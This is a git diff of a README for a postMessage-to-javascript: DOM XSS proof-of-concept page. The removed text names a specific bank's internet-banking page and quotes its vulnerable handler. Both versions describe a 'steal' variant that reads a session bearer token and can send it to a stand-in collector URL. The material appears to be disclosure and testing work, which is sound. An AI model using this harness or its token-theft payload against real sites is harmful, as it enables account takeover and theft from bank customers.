@@ -1,99 +1,61 @@
-# DBS Internet Banking — unvalidated `postMessage` → `javascript:` XSS
+# postMessage → `javascript:` PoC harness
 
-Proof of concept for a DOM-based XSS in the DBS Singapore Internet-Banking origin.
-
-* **Asset**: `https://internet-banking.dbs.com.sg/digi-web/ngib/` (React SPA)
-* **Vulnerable view**: `/digi-web/ngib/cul-onboarding` — *Apply for DBS Chromo Card*
-* **Defect**: the page's `message` handler accepts `{type:'REDIRECT_TO_SINGPASS', source:'mfe'}` from
-  any window, from any origin, and assigns `e.data.url` to `window.top.location.href`. No
-  `e.origin` / `e.source` validation and no protocol allow-list — a `javascript:` URL therefore executes
-  in the bank origin. The sibling branch of the *same* handler does validate `e.origin`, so this is a
-  logic omission, not a design decision.
-
-## Vulnerable code (production, unmodified)
-
-`static/js/8333.0883565b.chunk.js`, webpack module `38241`:
+A single static page that drives a well-known class of DOM XSS: a page whose `message` handler takes a
+URL out of the message and navigates to it
 
 ```js
-var k = { …, redirectToSingpass: "REDIRECT_TO_SINGPASS" };
-
-var e = function (e) {
-  var t, i, o;
-  if ("object" !== typeof e.data ||
-      e.data?.type !== k.redirectToSingpass ||
-      "mfe"   !== e.data?.source) {
-      /* every other message: sender IS validated */
-      if (nn) {
-        try { var a = new URL(nn).origin; if (e.origin !== a) return } catch (s) { return }
-      }
-      … MAP_* / HOAP_* handling …
-  } else {
-      /* REDIRECT_TO_SINGPASS: no origin, no source, no protocol check */
-      pn.store();
-      try {
-        var r = e.data.url;
-        window.top ? window.top.location.href = r : window.parent.location.href = r;
-      } catch (d) {}
+window.addEventListener('message', function (e) {
+  if (e.data && e.data.type === 'REDIRECT_TO_PROVIDER' && e.data.source === 'mfe') {
+    var r = e.data.url;
+    window.top ? window.top.location.href = r : window.parent.location.href = r;
   }
-};
-window.addEventListener("message", e);
+});
 ```
 
-The legitimate sender is the Chromo micro-frontend on `www.dbs.com.sg`:
+…without validating `e.origin`, `e.source` or the URL scheme. A `javascript:` URL supplied by any
+window that holds a handle to the target therefore executes in the target origin.
 
-```js
-requestSingpassRedirect(e) {
-  return window.parent.postMessage({type:"REDIRECT_TO_SINGPASS", url:e, source:"mfe"}, this.parentOrigin);
-}
+This repository contains **no target-specific data** — the target is passed in the URL, so the page
+can be pointed at whatever host the finding concerns.
+
+## Usage
+
+```
+poc.html?target=https://target.example/some/route/
+poc.html?target=https://target.example/some/route/&p=steal
+poc.html?target=https://target.example/some/route/&p=steal&hook=https://collector.example/hit
+poc.html?target=https://target.example/some/route/&msg={"type":"X","source":"mfe","url":"__URL__"}
 ```
 
-It does pass a `targetOrigin` — the receiving side is what ignores the sender.
-
-## Using this PoC
-
-1. Open `index.html` (or `poc.html` directly), allow pop-ups.
-2. The page calls `window.open('https://internet-banking.dbs.com.sg/digi-web/ngib/')` — the real
-   login page, real certificate — and keeps the `WindowProxy`.
-3. Sign in inside that window, then open **Apply for a DBS Chromo Card** in it.
-4. The page has been sending one `postMessage` every 400 ms all along; the moment the card view
-   mounts, the handler navigates itself to the `javascript:` payload and the dialog fires **in the DBS
-   origin**.
-
-Variants:
-
-| URL | payload |
+| parameter | meaning |
 |---|---|
-| `poc.html` | `alert('XSS in the iBanking origin: '+document.domain)` + `document.title='PWNED_BY_OPENER'` |
-| `poc.html?p=steal` | reads `redux.auth.tokenId` (the value the SPA sends as `Authorization: Bearer …`) through the React fiber tree, shows it in the dialog, optionally posts it to `?hook=` |
-| `poc.html?p=steal&hook=https://collector.example/hit` | same, plus exfiltration |
-| `poc.html?target=<url>` | open a different bank URL |
-| `poc.html?auto=0` | do not auto-start (click the button instead) |
+| `target` | page to open (https only); `__URL__` in `msg` is replaced by the payload |
+| `p` | `alert` (default) → `alert()` carrying `document.domain`; `steal` → read a redux session store through the React fiber tree and optionally forward it |
+| `hook` | optional exfiltration endpoint (`fetch`-free, uses an `Image()` GET) |
+| `msg` | full JSON message to send instead of the default shape |
+| `auto` | `0` disables auto-start |
 
-The page also works from `file://` (no hosting required) — an attacker-opened window accepts
-`postMessage` from any origin, including `null`.
+Allow pop-ups for the page; the dialog appears **in the target window**, not here.
 
-## Honest preconditions and caveats
+## Why a window handle is required
 
-* **The vulnerable view is a post-login route.** The route guard is a client-side redux check on
-  `auth.tokenId`; the session is an in-memory bearer token (nothing auth-related in
-  `localStorage`/`sessionStorage` at boot), so a window opened by navigation cannot inherit it.
-  This is why the tester has to sign in *inside* the window the PoC opens.
-* **Feature flag.** The view only stays mounted when
-  `featureFlags.featureFlagsSuccess.isYoungAdultCardMVP1Enabled === 'true'` (the flag is served by
-  `/IBNG/channels/feature-flags`, which answers `401 messageCode 1011` without a session, so its
-  production value cannot be read anonymously). With the flag forced on, the sink fires reliably in
-  testing; with it off the page deeplinks away and the handler is not registered. If the flow is dark
-  for the test account, the vulnerability is latent rather than exploitable.
-* **`javascript:` needs the bank page to be the top-level document** — the sink always targets
-  `window.top`, and `X-Frame-Options: SAMEORIGIN` prevents framing anyway.
-* No credentials of any DBS customer were used. Verified in testing by emulating the authenticated
-  state (the SPA's own `HARD_TOKEN_LOGIN_SUCCESS` action + its own router navigation).
+`postMessage` needs a reference to the target window: one you opened (`window.open`), your iframe or
+popup child, or your opener/parent. Navigation alone cannot deliver the message, and if the sink
+targets `window.top` (as the snippet above does), the vulnerable document must itself be the
+top-level document — an iframe would only ever navigate *your* window and cross-origin `javascript:`
+navigation is blocked.
+
+## Known precondition
+
+Sinks like this usually live on a post-authentication view, i.e. the handler is only registered after
+the target site's own client-side route mounts. A browser window cannot inherit an in-memory session
+by navigation, so the tester generally has to be signed in inside the window this page opens.
 
 ## Files
 
 | file | purpose |
 |---|---|
-| `index.html` | landing / instructions |
-| `poc.html` | the attack page (self-contained, no dependencies) |
+| `index.html` | landing page |
+| `poc.html` | the harness (self-contained, no dependencies) |
 | `.nojekyll` | serve files verbatim on GitHub Pages |
-| `README.md` | this document |
+| `.github/workflows/pages.yml` | Pages deployment workflow |
